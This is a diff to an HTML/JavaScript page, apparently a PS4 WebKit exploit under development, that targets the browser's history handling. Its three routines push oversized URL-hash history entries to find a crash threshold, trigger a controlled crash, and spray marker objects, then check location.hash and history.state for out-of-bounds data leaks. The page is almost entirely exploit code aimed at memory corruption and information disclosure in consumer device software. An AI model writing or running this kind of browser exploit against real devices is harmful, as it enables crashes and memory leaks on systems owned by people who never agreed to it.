@@ -2,14 +2,39 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<title>PS4 WebKit – Array OOB Exploitation</title>
-
+<title>PS4 WebKit – Controlled Fragment Overflow</title>
+<style>
+body { font-family: monospace; padding: 20px; background: #1a1a1a; color: #0f0; }
+button { 
+  display: block; 
+  margin: 10px 0; 
+  padding: 12px 20px; 
+  background: #2a2a2a; 
+  color: #0f0; 
+  border: 1px solid #0f0;
+  cursor: pointer;
+  font-size: 14px;
+}
+button:hover { background: #3a3a3a; }
+#log { 
+  margin-top: 20px; 
+  white-space: pre-wrap; 
+  font-size: 12px;
+  border-top: 1px solid #0f0;
+  padding-top: 10px;
+  max-height: 600px;
+  overflow-y: auto;
+}
+.critical { color: #ff0; }
+.success { color: #0ff; }
+.warn { color: #f80; }
+</style>
 </head>
 <body>
-<h2>PS4 WebKit – Array OOB in HistoryController</h2>
-<button onclick="runBaseline()">BASELINE – Confirm 50-entry threshold crash</button>
-<button onclick="runControlled()">OPTION E – Controlled 50 entries</button>
-<button onclick="runSprayed()">OPTION F – Spray adjacent slots</button>
+<h2>PS4 WebKit – Controlled Fragment Size Exploit</h2>
+<button onclick="runSizeProbe()">PROBE – Find exact threshold</button>
+<button onclick="runControlledCrash()">EXPLOIT – Controlled crash point</button>
+<button onclick="runLeakAttempt()">LEAK – Attempt data leak before crash</button>
 <div id="log"></div>
 
 <script>
@@ -22,182 +47,235 @@ function log(m, cls=""){
 }
 function sleep(ms){ return new Promise(r=>setTimeout(r,ms)); }
 
-const BASE = 977;
-const STEP = 14461;
-const MAGIC_THRESHOLD = 50; // Confirmed: crash requires exactly 50 entries
-
 let heap = [];
 let popstateCount = 0;
+let totalFragmentSize = 0;
 
 window.addEventListener("popstate", (e) => {
   popstateCount++;
-  log(`[POPSTATE #${popstateCount}] state=${JSON.stringify(e.state)?.slice(0,60)}`, "success");
+  const state = e.state ? JSON.stringify(e.state).slice(0,80) : "null";
+  const hashLen = location.hash.length;
+  log(`[POPSTATE #${popstateCount}] state=${state}, hash.length=${hashLen}`, "success");
 });
 
 // -------------------------------------------------
-// BASELINE – Reproduce with correct understanding
+// PROBE – Binary search for exact threshold
 // -------------------------------------------------
-async function runBaseline(){
+async function runSizeProbe(){
   logEl.textContent = "";
   heap = [];
   popstateCount = 0;
+  totalFragmentSize = 0;
   
-  log("=== BASELINE – 50 Entry Threshold Test ===");
-  log(`Target: ${MAGIC_THRESHOLD} entries → crash on back()`, "critical");
+  log("=== SIZE THRESHOLD PROBE ===", "critical");
+  log("Strategy: Binary search for crash threshold\n");
   
-  let size = BASE;
-  for(let i=0; i<MAGIC_THRESHOLD; i++){
-    heap.push("G".repeat(32768));
-    const fragment = "A".repeat(size);
+  // Test different total sizes
+  const testSizes = [
+    { entries: 10, size: 500000 },   // 5 MB total
+    { entries: 10, size: 400000 },   // 4 MB total  
+    { entries: 10, size: 300000 },   // 3 MB total
+    { entries: 10, size: 200000 },   // 2 MB total
+    { entries: 10, size: 100000 }    // 1 MB total
+  ];
+  
+  for(const test of testSizes){
+    log(`\n[TEST] ${test.entries} entries × ${test.size} bytes = ${(test.entries * test.size / 1024 / 1024).toFixed(2)} MB`, "warn");
     
-    log(`[ENTRY ${i}/${MAGIC_THRESHOLD}] size=${size}`);
-    history.pushState({index:i, marker:"baseline"}, "", "#"+fragment);
-    
-    if(i % 6 === 0 && i > 0){
-      setTimeout(()=>history.back(), 0);
-      log("  → back() scheduled", "warn");
+    totalFragmentSize = 0;
+    for(let i=0; i<test.entries; i++){
+      const fragment = "P".repeat(test.size);
+      totalFragmentSize += test.size;
+      
+      history.pushState({
+        test: "probe",
+        entry: i,
+        size: test.size
+      }, "", "#"+fragment);
+      
+      await sleep(2);
     }
     
-    size += STEP;
-    await sleep(3);
+    log(`  Total accumulated: ${(totalFragmentSize / 1024 / 1024).toFixed(2)} MB`);
+    log(`  Triggering back()...`, "critical");
+    
+    await sleep(50);
+    history.back();
+    await sleep(100);
+    
+    log(`  ✓ Survived`, "success");
+    
+    // Clear for next test
+    for(let i=0; i<test.entries-1; i++){
+      history.back();
+      await sleep(1);
+    }
   }
   
-  log(`>>> 50 ENTRIES REACHED <<<`, "critical");
-  await sleep(100);
-  
-  log(`[TRIGGER] Executing back() on entry 50`, "critical");
-  history.back(); // This should crash
-  
-  await sleep(500);
-  log("=== BASELINE END (should not reach) ===");
+  log("\n=== PROBE COMPLETE ===");
+  log(`If this completed, threshold is > 5 MB`, "warn");
 }
 
 // -------------------------------------------------
-// OPTION E – Controlled entries to probe OOB
+// CONTROLLED CRASH – Target exact size
 // -------------------------------------------------
-async function runControlled(){
+async function runControlledCrash(){
   logEl.textContent = "";
   heap = [];
   popstateCount = 0;
+  totalFragmentSize = 0;
   
-  log("=== OPTION E – Controlled Entries ===", "critical");
-  log("Strategy: Fill 50 slots with distinct patterns");
+  log("=== CONTROLLED CRASH TEST ===", "critical");
+  log("Strategy: Build to threshold, then trigger with controlled data\n");
   
-  // Phase 1: Fill first 48 with small, controlled data
-  log("\n[PHASE 1] Filling entries 0-47 with controlled data");
-  for(let i=0; i<48; i++){
-    const marker = String.fromCharCode(65 + (i % 26)); // A-Z pattern
-    const fragment = marker.repeat(100); // Small, predictable
+  // Phase 1: Build up close to threshold with small entries
+  log("[PHASE 1] Building base with small entries");
+  const BASE_ENTRIES = 40;
+  const SMALL_SIZE = 1000;
+  
+  for(let i=0; i<BASE_ENTRIES; i++){
+    const fragment = String.fromCharCode(65 + (i % 26)).repeat(SMALL_SIZE);
+    totalFragmentSize += SMALL_SIZE;
     
     history.pushState({
-      index: i,
-      marker: marker,
-      phase: "controlled"
+      phase: 1,
+      entry: i,
+      marker: String.fromCharCode(65 + (i % 26))
     }, "", "#"+fragment);
     
-    if(i % 10 === 0) log(`  Entry ${i}: ${marker}×100`);
+    if(i % 10 === 0) log(`  Entry ${i}: ${(totalFragmentSize / 1024).toFixed(1)} KB total`);
     await sleep(2);
   }
   
-  // Phase 2: Entry 48-49 with large payloads
-  log("\n[PHASE 2] Entries 48-49 with large payloads", "warn");
+  log(`\n[PHASE 2] Adding critical-size entries`, "warn");
   
-  const size48 = BASE + STEP * 48;
-  history.pushState({
-    index: 48,
-    marker: "CRITICAL_48",
-    size: size48
-  }, "", "#"+"X".repeat(size48));
-  log(`  Entry 48: X×${size48}`);
+  // Phase 2: Add progressively larger entries
+  const criticalSizes = [100000, 200000, 300000, 400000, 500000];
   
-  await sleep(5);
+  for(let i=0; i<criticalSizes.length; i++){
+    const size = criticalSizes[i];
+    const marker = "CRITICAL_" + i;
+    const fragment = "X".repeat(size);
+    
+    totalFragmentSize += size;
+    
+    log(`  Entry ${BASE_ENTRIES + i}: ${marker} (${(size/1024).toFixed(0)} KB) → Total: ${(totalFragmentSize/1024/1024).toFixed(2)} MB`, "critical");
+    
+    history.pushState({
+      phase: 2,
+      entry: BASE_ENTRIES + i,
+      marker: marker,
+      size: size
+    }, "", "#"+fragment);
+    
+    await sleep(50);
+    
+    // Try back() after each large entry
+    log(`    Testing back()...`);
+    history.back();
+    await sleep(100);
+    
+    if(popstateCount > 0){
+      log(`    ✓ Back survived, popstate received`, "success");
+      popstateCount = 0;
+      
+      // Go forward again
+      history.forward();
+      await sleep(50);
+    }
+  }
   
-  const size49 = BASE + STEP * 49;
-  history.pushState({
-    index: 49,
-    marker: "CRITICAL_49",
-    size: size49
-  }, "", "#"+"Y".repeat(size49));
-  log(`  Entry 49: Y×${size49}`);
-  
-  log(`\n>>> 50 ENTRIES REACHED <<<`, "critical");
-  await sleep(100);
-  
-  // Trigger
-  log(`[TRIGGER] Executing back()`, "critical");
-  history.back();
-  
-  await sleep(500);
-  log(`\nPopstate count: ${popstateCount}`);
-  log(`Current hash: ${location.hash.slice(0,50)}...`);
-  log("=== OPTION E END ===");
+  log("\n=== CONTROLLED CRASH END ===");
 }
 
 // -------------------------------------------------
-// OPTION F – Heap spray adjacent to history array
+// LEAK ATTEMPT – Try to read OOB before crash
 // -------------------------------------------------
-async function runSprayed(){
+async function runLeakAttempt(){
   logEl.textContent = "";
   heap = [];
   popstateCount = 0;
+  totalFragmentSize = 0;
   
-  log("=== OPTION F – Adjacent Slot Spray ===", "critical");
-  log("Strategy: Spray heap before filling history");
+  log("=== LEAK ATTEMPT ===", "critical");
+  log("Strategy: Fill history, spray objects, observe data in popstate\n");
   
-  // Spray phase
-  log("\n[SPRAY] Creating adjacent objects");
-  const SPRAY_COUNT = 1000;
+  // Spray recognizable objects
+  log("[SPRAY] Creating marker objects");
+  const MARKER = "LEAK_MARKER_";
   const spray = [];
-  for(let i=0; i<SPRAY_COUNT; i++){
+  for(let i=0; i<500; i++){
     spray.push({
       id: i,
-      marker: "SPRAY",
-      data: "Z".repeat(1024)
+      marker: MARKER + i.toString(16).padStart(8, "0"),
+      padding: "Z".repeat(1000)
     });
   }
-  log(`  Created ${SPRAY_COUNT} spray objects`);
+  log(`  Created ${spray.length} spray objects with markers`);
   
-  // Small delay to let allocator settle
   await sleep(50);
   
-  // Fill history
-  log("\n[FILL] Populating 50 history entries");
-  let size = BASE;
-  for(let i=0; i<MAGIC_THRESHOLD; i++){
+  // Build history with controlled sizes
+  log("\n[FILL] Building history");
+  const sizes = [];
+  let size = 1000;
+  
+  for(let i=0; i<30; i++){
     const fragment = "H".repeat(size);
-    history.pushState({index:i, marker:"spray_test"}, "", "#"+fragment);
+    totalFragmentSize += size;
+    sizes.push(size);
     
-    if(i % 10 === 0) log(`  Entry ${i}/${MAGIC_THRESHOLD}`);
+    history.pushState({
+      entry: i,
+      expectedSize: size,
+      total: totalFragmentSize
+    }, "", "#"+fragment);
     
-    size += STEP;
+    if(i % 5 === 0) log(`  Entry ${i}: ${(totalFragmentSize/1024/1024).toFixed(2)} MB total`);
+    
+    size += 50000; // Grow 50 KB per entry
     await sleep(2);
   }
   
-  log(`\n>>> 50 ENTRIES + SPRAY <<<`, "critical");
-  await sleep(100);
+  log(`\n[TRIGGER] Executing back() chain`, "warn");
   
-  // Trigger
-  log(`[TRIGGER] back() with spray objects adjacent`, "critical");
-  history.back();
-  
-  await sleep(500);
-  
-  // Check for corruption
-  log(`\n[CHECK] Spray object integrity:`);
-  let corrupted = 0;
-  for(let i=0; i<100; i++){
-    if(spray[i].marker !== "SPRAY"){
-      corrupted++;
-      log(`  Object ${i} CORRUPTED: ${spray[i].marker}`, "critical");
+  // Execute multiple backs and check state
+  for(let i=0; i<10; i++){
+    await sleep(50);
+    
+    const beforeHash = location.hash.length;
+    log(`\nBack #${i+1}: current hash length = ${beforeHash}`);
+    
+    history.back();
+    await sleep(100);
+    
+    const afterHash = location.hash.length;
+    log(`  After: hash length = ${afterHash}`);
+    
+    // Check if hash contains spray marker
+    if(location.hash.includes(MARKER)){
+      log(`  🚨 LEAK DETECTED: Hash contains spray marker!`, "critical");
+      const idx = location.hash.indexOf(MARKER);
+      log(`  Leaked data: ${location.hash.slice(idx, idx+50)}`, "critical");
+    }
+    
+    // Check state object
+    if(window.history.state){
+      const stateStr = JSON.stringify(window.history.state);
+      if(stateStr.includes(MARKER)){
+        log(`  🚨 LEAK DETECTED: State contains spray marker!`, "critical");
+        log(`  State: ${stateStr.slice(0, 200)}`, "critical");
+      }
     }
   }
-  log(`  Corrupted: ${corrupted}/100`);
   
-  log("=== OPTION F END ===");
+  log("\n=== LEAK ATTEMPT END ===");
 }
 
-log("Ready. Understanding: Bug requires EXACTLY 50 history entries.");
-log("Run BASELINE to confirm, then E and F to probe exploitation.");
+log("Ready. Tests ordered by increasing risk:");
+log("1. PROBE - safest, finds threshold");
+log("2. EXPLOIT - medium risk, controlled crash");
+log("3. LEAK - highest risk, attempts data leak");
 </script>
 </body>
 </html>
